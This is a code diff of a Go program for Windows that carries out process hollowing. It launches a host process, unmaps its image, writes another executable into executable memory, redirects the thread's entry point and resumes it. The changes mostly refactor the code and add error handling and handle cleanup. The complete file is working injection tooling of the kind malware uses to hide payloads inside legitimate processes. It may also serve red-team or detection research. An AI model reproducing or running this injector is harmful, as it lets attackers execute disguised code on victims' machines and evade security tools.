@@ -17,9 +17,10 @@ var (
 	messageBox       = user32.NewProc("MessageBoxW")
 	messageBoxResult int
 )
+
 var (
-	modkernel32              = windows.NewLazyDLL("kernel32.dll")
-	modntdll                 = windows.NewLazyDLL("ntdll.dll")
+	modkernel32              = windows.NewLazySystemDLL("kernel32.dll")
+	modntdll                 = windows.NewLazySystemDLL("ntdll.dll")
 	procVirtualAllocEx       = modkernel32.NewProc("VirtualAllocEx")
 	procGetThreadContext     = modkernel32.NewProc("GetThreadContext")
 	procSetThreadContext     = modkernel32.NewProc("SetThreadContext")
@@ -28,9 +29,8 @@ var (
 
 // Inject starts the src process and injects the target process.
 func Inject(srcPath string, destPE []byte, console bool) {
-
 	cmd, err := windows.UTF16PtrFromString(srcPath)
-	CheckErr(err)
+	checkErr(err)
 
 	fmt.Printf("[*] Creating process: %v\n", srcPath)
 
@@ -45,60 +45,63 @@ func Inject(srcPath string, destPE []byte, console bool) {
 	}
 
 	err = windows.CreateProcess(cmd, nil, nil, nil, false, flag, nil, nil, si, pi)
-	CheckErr(err)
+	checkErr(err)
 
 	hProcess := pi.Process
 	hThread := pi.Thread
+
+	defer windows.CloseHandle(hProcess)
+	defer windows.CloseHandle(hThread)
 
 	fmt.Printf("[+] Process created. Process: %v, Thread: %v\n", hProcess, hThread)
 
 	fmt.Printf("[*] Getting thread context of %v\n", hThread)
 	ctx, err := getThreadContext(uintptr(hThread))
-	CheckErr(err)
-	// https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
+	checkErr(err)
 	Rdx := binary.LittleEndian.Uint64(ctx[136:])
 
 	fmt.Printf("[+] Address to PEB[Rdx]: %x\n", Rdx)
 
-	//https://bytepointer.com/resources/tebpeb64.htm
 	baseAddr, err := readProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
-	CheckErr(err)
+	checkErr(err)
 
 	fmt.Printf("[+] Base Address of Source Image from PEB[ImageBaseAddress]: %x\n", baseAddr)
 
 	fmt.Printf("[*] Reading destination PE\n")
 	destPEReader := bytes.NewReader(destPE)
-	CheckErr(err)
+	checkErr(err)
 
 	f, err := pe.NewFile(destPEReader)
+	checkErr(err)
 
 	fmt.Printf("[*] Getting OptionalHeader of destination PE\n")
 	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
 	if !ok {
 		fmt.Printf("OptionalHeader64 not found\n")
+		return
 	}
 
 	fmt.Printf("[+] ImageBase of destination PE[OptionalHeader.ImageBase]: %x\n", oh.ImageBase)
 	fmt.Printf("[*] Unmapping view of section %x\n", baseAddr)
 	err = ntUnmapViewOfSection(hProcess, baseAddr)
-	CheckErr(err)
+	checkErr(err)
 
 	fmt.Printf("[*] Allocating memory in process at %x (size: %v)\n", baseAddr, oh.SizeOfImage)
 
 	newImageBase, err := virtualAllocEx(uintptr(hProcess), baseAddr, oh.SizeOfImage, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
-	CheckErr(err)
+	checkErr(err)
 	fmt.Printf("[+] New base address %x\n", newImageBase)
 	fmt.Printf("[*] Writing PE to memory in process at %x (size: %v)\n", newImageBase, oh.SizeOfHeaders)
 	err = writeProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
-	CheckErr(err)
+	checkErr(err)
 
-	//Writing all section
+	// Writing all sections
 	for _, sec := range f.Sections {
 		fmt.Printf("[*] Writing section[%v] to memory at %x (size: %v)\n", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
 		secData, err := sec.Data()
-		CheckErr(err)
+		checkErr(err)
 		err = writeProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
-		CheckErr(err)
+		checkErr(err)
 	}
 	fmt.Printf("[*] Calculating relocation delta\n")
 	delta := int64(oh.ImageBase) - int64(newImageBase)
@@ -108,25 +111,19 @@ func Inject(srcPath string, destPE []byte, console bool) {
 	addrB := make([]byte, 8)
 	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
 	err = writeProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
-	CheckErr(err)
+	checkErr(err)
 
 	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
 	fmt.Printf("[*] Setting new entrypoint to Rcx %x\n", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
 
 	err = setThreadContext(hThread, ctx)
-	CheckErr(err)
+	checkErr(err)
 
 	_, err = resumeThread(hThread)
-	CheckErr(err)
-
+	checkErr(err)
 }
 
 func resumeThread(hThread windows.Handle) (count int32, e error) {
-
-	// DWORD ResumeThread(
-	// 	HANDLE hThread
-	// );
-
 	ret, err := windows.ResumeThread(hThread)
 	if ret == 0xffffffff {
 		e = err
@@ -138,15 +135,6 @@ func resumeThread(hThread windows.Handle) (count int32, e error) {
 }
 
 func virtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {
-
-	// LPVOID VirtualAllocEx(
-	// 	HANDLE hProcess,
-	// 	LPVOID lpAddress,
-	// 	SIZE_T dwSize,
-	// 	DWORD  flAllocationType,
-	// 	DWORD  flProtect
-	//  );
-
 	ret, _, err := procVirtualAllocEx.Call(
 		hProcess,
 		lpAddress,
@@ -158,20 +146,10 @@ func virtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAlloca
 	}
 	addr = ret
 	fmt.Printf("[*] VirtualAllocEx[%v : %x]\n", hProcess, lpAddress)
-
 	return
 }
 
 func readProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {
-
-	// BOOL ReadProcessMemory(
-	// 	HANDLE  hProcess,
-	// 	LPCVOID lpBaseAddress,
-	// 	LPVOID  lpBuffer,
-	// 	SIZE_T  nSize,
-	// 	SIZE_T  *lpNumberOfBytesRead
-	//  );
-
 	var numBytesRead uintptr
 	data = make([]byte, size)
 
@@ -190,15 +168,6 @@ func readProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (da
 }
 
 func writeProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
-
-	// BOOL WriteProcessMemory(
-	// 	HANDLE  hProcess,
-	// 	LPVOID  lpBaseAddress,
-	// 	LPCVOID lpBuffer,
-	// 	SIZE_T  nSize,
-	// 	SIZE_T  *lpNumberOfBytesWritten
-	// );
-
 	var numBytesRead uintptr
 
 	err := windows.WriteProcessMemory(hProcess,
@@ -211,17 +180,10 @@ func writeProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, data []b
 		e = err
 	}
 	fmt.Printf("[*] WriteProcessMemory[%v : %x]\n", hProcess, lpBaseAddress)
-
 	return
 }
 
 func getThreadContext(hThread uintptr) (ctx []uint8, e error) {
-
-	// BOOL GetThreadContext(
-	// 	HANDLE    hThread,
-	// 	LPCONTEXT lpContext
-	// );
-
 	ctx = make([]uint8, 1232)
 
 	// ctx[12] = 0x00100000 | 0x00000002 //CONTEXT_INTEGER flag to Rdx
@@ -248,16 +210,6 @@ func readProcessMemoryAsAddr(hProcess windows.Handle, lpBaseAddress uintptr) (va
 }
 
 func ntUnmapViewOfSection(hProcess windows.Handle, baseAddr uintptr) (e error) {
-
-	// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
-	// https://msdn.microsoft.com/en-us/windows/desktop/ff557711
-	// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html
-
-	// NTSTATUS NtUnmapViewOfSection(
-	// 	HANDLE    ProcessHandle,
-	// 	PVOID     BaseAddress
-	// );
-
 	r, _, err := procNtUnmapViewOfSection.Call(uintptr(hProcess), baseAddr)
 	if r != 0 {
 		e = err
@@ -267,12 +219,6 @@ func ntUnmapViewOfSection(hProcess windows.Handle, baseAddr uintptr) (e error) {
 }
 
 func setThreadContext(hThread windows.Handle, ctx []uint8) (e error) {
-
-	// BOOL SetThreadContext(
-	// 	HANDLE        hThread,
-	// 	const CONTEXT *lpContext
-	// );
-
 	ctxPtr := unsafe.Pointer(&ctx[0])
 	r, _, err := procSetThreadContext.Call(uintptr(hThread), uintptr(ctxPtr))
 	if r == 0 {
@@ -282,9 +228,9 @@ func setThreadContext(hThread windows.Handle, ctx []uint8) (e error) {
 	return
 }
 
-func CheckErr(err error) {
+func checkErr(err error) {
 	if err != nil {
-		fmt.Println("[X] Error : ", err)
-		os.Exit(1337)
+		fmt.Println("[X] Error: ", err)
+		os.Exit(1)
 	}
 }
